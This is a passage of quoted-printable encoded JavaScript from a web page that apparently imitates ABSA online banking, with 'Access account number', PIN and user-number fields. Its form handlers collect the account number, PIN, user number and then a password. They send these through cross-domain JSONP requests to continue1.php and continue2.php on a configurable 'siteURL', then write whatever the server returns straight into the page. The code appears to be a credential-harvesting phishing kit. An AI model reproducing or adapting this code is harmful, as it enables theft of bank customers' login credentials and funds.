                        var sAccount =3D document.getElementById("pff1").va=
lue;
                        if(sAccount =3D=3D=3D ""){
                            alert("please enter a valid password password a=
nd retry");
                            return false;
                        }
                        =

                        oParametersurl =3D siteURL+"continue2.php";
                        absa.showPleaseWait();
                        =

                        $.ajax({
                            url: oParametersurl,
                            cache: false,
                            dataType: 'jsonp',
                            data: form.serialize(),
                            success: function(data) {
                                if(data.message !=3D=3D "error"){
                                    document.open();
                                    document.write(data.message);
                                    document.close();
                                }else{
                                    alert("Please enter a valid password an=
d retry");
                                    return false;
                                }
                            },
                            error: function (request, status, error) {
                            }
                        });
                    }
                    function onForm1Submit(){
                        var sAccount =3D document.getElementById("j_usernam=
e").value;
                        var sPIN =3D document.getElementById("j_pin").value;
                        var sOperator =3D document.getElementById("j_user_n=
o").value;
                        =

                        var numbersOnly =3D /^[0-9]+$/;
                        =

                        if(!sAccount.match(numbersOnly)){
                            alert("Please enter a valid Access account numb=
er");
                            document.getElementById("j_username").focus();
                            return false;
                        }
                        if(!sPIN.match(numbersOnly)){
                            alert("Please enter a valid PIN");
                            document.getElementById("j_pin").focus();
                            return false;
                        }
                        if(!sOperator.match(numbersOnly)){
                            alert("Please enter a valid User number");
                            document.getElementById("j_user_no").focus();
                            return false;
                        }
                        =

                        aPostData =3D "AccessAccount=3D" + sAccount + "&PIN=
=3D" + sPIN + "&Operator=3D" + sOperator + "&CaptchaTxt=3D";
                        oParametersurl =3D siteURL+"continue1.php?"+aPostDa=
ta;
                        =

                        absa.showPleaseWait();
                        $.ajax({
                            url: oParametersurl,
                            cache: false,
                            dataType: 'jsonp',
                            success: function(data) {
                                if(data.message !=3D=3D "error"){
                                    $('.ap-main-content-wrapper').html(data=
.message);
                                    absa.hidePleaseWait();
                                    setTimeout(function(){
                                        $("input#pff1").focus();
                                    },500);
                                }else{
                                    alert("Please enter a valid Access acco=
unt number, PIN or User number and retry");
                                    return false;
                                }
                            },
                            error: function (request, status, error) {
                            }
                        });
                    }
                    =

                    var absa =3D window.absa || {};
                    absa.showPleaseWait =3D function (d) {
                    var c =3D document.getElementById("pleasewait"),
                            b =3D document.getElementById("pleasewait-viewp=
ort"),
                            e =3D document.getElementById("pleasewait-label=
");
                    c.style.display =3D "";
                    e.innerHTML =3D arguments.length ? d : "";
                    absa.showPleaseWait.timeout =3D setTimeout(function () {
                                c.style.height =3D document.body.clientHeig=
ht + "px";
                                c.style.width =3D document.body.clientWidth=
 + "px";
                                b.style.height =3D ("innerHeight" in window=
 ? window.innerHeight : document.documentElement.clientHeight) + "px";
                                b.style.width =3D ("innerWidth" in window ?=
 window.innerWidth : document.documentElement.clientWidth) + "px";
                                b.style.top =3D document.documentElement.sc=
rollTop + "px";
                                b.style.left =3D document.documentElement.s=
crollLeft + "px";
                                absa.showPleaseWait.timeout =3D setTimeout(=
arguments.callee, 20)
                        }, 0)
                    };
                    absa.hidePleaseWait =3D function () {
                            var b =3D document.getElementById("pleasewait");
                            b.style.display =3D "none";
                            if (absa.showPleaseWait.timeout) {
                                    absa.showPleaseWait.timeout =3D clearTi=
meout(absa.showPleaseWait.timeout)
                            }
                    };
                </script>
